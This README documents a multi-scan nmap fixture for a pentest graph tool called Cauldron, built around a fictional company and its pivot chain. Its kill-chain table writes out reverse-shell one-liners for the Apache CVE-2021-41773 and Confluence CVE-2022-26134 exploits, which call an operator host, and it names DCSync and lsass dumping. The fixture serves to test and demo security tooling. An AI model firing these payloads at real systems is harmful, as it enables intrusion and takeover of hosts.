# Pivot-demo: multi-source engagement fixture

Four nmap XML files representing a realistic multi-day pentest
against a fictional company ("Northwind Manufacturing"). The hosts
along the pivot chain carry **textbook, well-known CVEs** that
Cauldron's `boil --nvd --ai` pipeline catches via product+version
detection — every hop in the kill chain is exploitable with a
publicly documented one-liner. Import them sequentially to exercise
Cauldron's:

- **Multi-source scan ingestion** — every file becomes its own
  `:ScanSource` node in the graph.
- **Traceroute hop materialization** — intermediate routers come in as
  `:Host` nodes with zero services on first sight.
- **Implicit hop promotion** — when a later scan actually targets an
  IP that was previously a hop, MERGE-based ingestion fills in the
  services / OS / role. No explicit provenance flag, no migration —
  the host just stops being empty.
- **Topology-routed rendering** — the graph view threads each scanned
  host through the gateway/switch chain instead of fanning out from
  the scan source.
- **Scan-diff detection** — re-importing the same scan source after
  the environment shifted stamps `is_new` / `is_stale` / `has_changes`
  on the affected hosts (`⭐` / `❌` / `⚠️` label prefixes in the UI).
- **Cliché-CVE chain to DC** — Apache 2.4.49 path traversal on the
  perimeter, Confluence OGNL injection on the DC. Both detected by
  the NVD enrichment phase from the product+version strings nmap
  prints; both have one-liner reverse-shell exploits documented
  publicly. The pentest narrative goes external → DMZ pivot →
  Domain Controller without any step depending on manual SQLi /
  webapp tricks Cauldron can't see.

## The cliché kill chain (what the operator chains together)

Every pivot transition in this fixture is enabled by a publicly
documented, version-detectable CVE — the kind every pentester
recognizes on sight. Cauldron picks each one up from nmap's
`product`+`version` fields via the NVD enrichment phase.

| Step | From → To | Service detected | CVE | One-line exploit |
|---|---|---|---|---|
| 1 | `203.0.113.50` (operator) → `10.0.2.10` (web01) | Apache httpd **2.4.49** on :80 | **CVE-2021-41773** (path traversal + CGI RCE) | `curl 'http://web01/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo;id;nc 203.0.113.50 4444 -e /bin/bash'` |
| 2 | `10.0.2.10` (web01) → `10.0.1.10` (DC01) | Atlassian Confluence **7.13.6** on :8090 | **CVE-2022-26134** (OGNL injection, pre-auth RCE) | `curl 'http://dc01:8090/${@java.lang.Runtime@getRuntime().exec("nc 10.0.2.10 4444 -e /bin/bash")}/'` |
| 3 | `10.0.1.10` (DC01) → DA / mgmt subnet | SYSTEM-level Confluence shell on a DC → trivial DCSync / SeImpersonate / lsass dump | — | (post-exploitation, not a CVE) |

`boil --nvd` should attach both CVEs as `HAS_VULN` edges on the
respective services. CVE-2021-41773 is in CISA KEV; CVE-2022-26134
is in CISA KEV — both render in the UI with `EXPLOIT` and `KEV`
badges, making the chain immediately obvious from the host detail
pane.

The operator's box `203.0.113.50` carries no vulnerabilities in the
graph **on purpose** — it's the entry point, not a target. Adding a
`<host>` block for it would merge it into a regular `:Host` node and
defeat the standalone `:ScanSource` demo. Click it on the canvas to
see scan args / first_seen / last_seen instead.

## The engagement narrative

```
Internet (203.0.113.50, operator's box)
    │
    │  3 ISP hops
    ▼
198.51.100.1 — fw-edge.northwind.local       (external firewall)
    │
    ▼
10.0.2.1 — dmz-gw / core-rtr-dmz             (DMZ gateway)
    │
    ├── 10.0.2.10  web01     (Apache 2.4.49 — CVE-2021-41773)
    ├── 10.0.2.11  web02     (Tomcat 9.0.46)
    ├── 10.0.2.20  mail      (Exchange 2019 — ProxyShell)
    ├── 10.0.2.30  ftp       (vsftpd 2.3.4 — backdoor)
    └── 10.0.2.5   vpn-gw    (Fortinet — CVE-2022-42475)
                │
                ▼
            10.0.0.1 — core-rtr                (internal router)
                │
                ├── Internal subnet 10.0.1.0/24
                │     ├── DC01, DC02            (Windows Server 2019, ZeroLogon)
                │     ├── db01                  (MSSQL 2019, default creds)
                │     ├── file01                (Samba 4.13, signing disabled)
                │     ├── wks01, wks02          (Win 10, signing disabled)
                │     └── print01               (HP JetDirect, SNMP public)
                │
                └── Management subnet 10.0.99.0/24
                      ├── 10.0.99.1   mgmt-gw   (MikroTik, SNMP public)
                      ├── 10.0.99.10  bak01     (Bacula, weak creds)
                      ├── 10.0.99.20  hsm01     (SSH)
                      └── 10.0.99.30  ipmi01    (IPMI cipher zero — CVE-2013-4786)
```

## The three scans

### 1. `01_external.xml`

Scanner at `203.0.113.50` (operator's box on the public internet).
Only public-facing services on the Northwind edge IP block
`198.51.100.0/24` are visible: web, mail, ftp, vpn. The traceroute
shows the ISP path plus `198.51.100.1` (edge firewall) and `10.0.2.1`
(DMZ gateway) — both come in as empty `:Host` nodes.

5 hosts up. ScanSource name: `01_external`.

### 2. `02_dmz_pivot.xml`

After exploiting `CVE-2021-41773` on web01, the operator has RCE on a
DMZ host. They drop a static nmap binary into `/tmp` and scan from
`10.0.2.10`. Now reachable:

- DMZ peers, re-scanned with internal-only ports visible (SSH, MySQL)
- `10.0.2.1` (DMZ gateway) — previously a hop, now port-scanned;
  reveals SSH, Telnet, SNMP, web mgmt. Its hostname updates from
  `dmz-gw.northwind.local` (traceroute view) to
  `core-rtr-dmz.northwind.local` (internal view).
- `10.0.0.1` (core router) — also previously a hop, now full host.
- Internal subnet `10.0.1.0/24` — visible for the first time.

12 hosts up. ScanSource name: `02_dmz_pivot`.

### 3. `03_internal_pivot.xml`

After ZeroLogon (`CVE-2020-1472`) against DC01, the operator has DA
and runs a scan from a script-runner account on the DC. Now reachable:

- Management subnet `10.0.99.0/24` — out-of-band infrastructure that
  was firewalled off from both the DMZ and internal user subnets.
  Reveals the backup server, HSM front-end, and IPMI controllers.

4 hosts up (all new). ScanSource name: `03_internal_pivot`.

### 4. `04_external_rescan.xml` — same source as scan 1, two weeks later

Scanner re-runs from the same external box (`203.0.113.50`, same
ScanSource name, same scope `198.51.100.0/24`). Imports against the
same `:ScanSource` node — the diff engine compares this snapshot
against scan 1's and stamps badges on the three hosts that shifted:

| IP | Diff state | What changed |
|---|---|---|
| `198.51.100.10` (web01) | **CHANGED** ⚠️ | Apache 2.4.49 → 2.4.55 (CVE-2021-41773 patched), `:22` SSH newly exposed, `:443` taken down |
| `198.51.100.30` (ftp)   | **GONE** ❌    | Decommissioned by blue team after the vsftpd 2.3.4 finding |
| `198.51.100.40` (staging) | **NEW** ⭐  | Previously-unannounced staging server, Jenkins exposed |

The unchanged hosts (mail, web02, vpn-gw) get their `last_seen`
bumped but no badges — they look identical between the two snapshots.

**Note on the global-baseline `is_new` semantics**: Cauldron's
`is_new` flag is "first_seen > graph baseline", where baseline is
the earliest scan in the graph. After all 4 imports, every host
introduced in scans 2 and 3 (internal + mgmt subnets) also shows
`NEW` — they really *are* new to the graph relative to scan 1's
baseline. To see ONLY the rescan diff in isolation, import just
scans 1 and 4 against an empty graph.

## What to expect after each import

| | After scan 1 | After scan 2 | After scan 3 |
|---|---|---|---|
| `:ScanSource` nodes | 1 | 2 | 3 |
| `:Host` nodes | 10 (5 scanned + 5 hops) | 21 (17 scanned + 4 hops) | 25 (21 scanned + 4 hops) |
| Hops promoted to scanned | 0 | 1 (`10.0.2.1`) | 1 (still) |
| Subnets visible | 1 DMZ | 3 (DMZ + internal + transit) | 4 (+ mgmt) |

The four hops that stay empty across all three scans are upstream
ISP / edge-firewall IPs we never targeted: `203.0.113.1`,
`100.64.10.1`, `100.64.0.5`, `198.51.100.1`. They're useful as a
reminder that traceroute discovered them, but they're out of scope
for this engagement — Cauldron correctly keeps them as zero-service
hosts rather than dropping them.

Note: `10.0.0.1` (core router) first appears in scan 2 — both as the
ttl=2 hop on every internal-target's trace AND as a directly-scanned
target. The same MERGE handles both: it materializes the node once,
then the scan-path fills in services. Net effect: 1 promotion event
(`10.0.2.1` from scan 1's hop set), and one host that came in as
"already scanned" rather than promoted.

## Importing

```bash
# Clear if there's something else in the graph (the sample is the demo).
cauldron reset

# Sequential imports — each file becomes its own ScanSource node
# UNLESS the name matches an existing one (scan 4 re-uses scan 1's
# ScanSource so its diff is computed against scan 1).
cauldron brew data/samples/pivot_demo/01_external.xml       --source 203.0.113.50
cauldron brew data/samples/pivot_demo/02_dmz_pivot.xml      --source 10.0.2.10
cauldron brew data/samples/pivot_demo/03_internal_pivot.xml --source 10.0.1.10
cauldron brew data/samples/pivot_demo/04_external_rescan.xml --source 203.0.113.50

# Look at the graph in the UI: http://localhost:5173
# Or enrich + analyze:
cauldron boil --nvd
```

Using the IP-as-source-name matters for two things: it triggers the
pivot-merge logic (host that's also a scanner gets merged into one
node with `is_scan_source: true`), and the scan-diff engine matches
scan 4 to scan 1 by ScanSource name.

## How this stresses the engine

- **Hop promotion**: `10.0.2.1` is a traceroute hop in scan 1, a
  scanned target in scan 2. Verify in Neo4j Browser:
  ```cypher
  MATCH (h:Host {ip: '10.0.2.1'})-[:HAS_SERVICE]->(s) RETURN s
  ```
  After scan 1 alone: zero rows. After scan 2: SSH / SNMP / HTTP show
  up. No special promotion logic was invoked — the same `_upsert_host`
  path handled it via MERGE.
- **Hostname update across scans**: `10.0.2.1` first comes in as
  `dmz-gw.northwind.local` (the name traceroute saw on the
  external-facing interface). Scan 2 overrides with
  `core-rtr-dmz.northwind.local` (the internal-side PTR). The
  COALESCE in `_upsert_host` lets the new non-null hostname win.
- **Multi-source attack paths**: with all three sources, attack paths
  can chain through pivots: `external → web01 (DMZ) → DC01 → mgmt`.
  Each ScanSource contributes its share of `:SCANNED_FROM` edges, and
  the path engine combines them.
- **Topology rendering**: the graph view threads each host through its
  trace, so scan 1's view of mail.northwind.local is rendered as
  `external → 198.51.100.1 → 10.0.2.1 → mail`, not a direct red line.

Treat this directory as the **canonical reference** for what a
multi-scan engagement is supposed to look like in Cauldron.
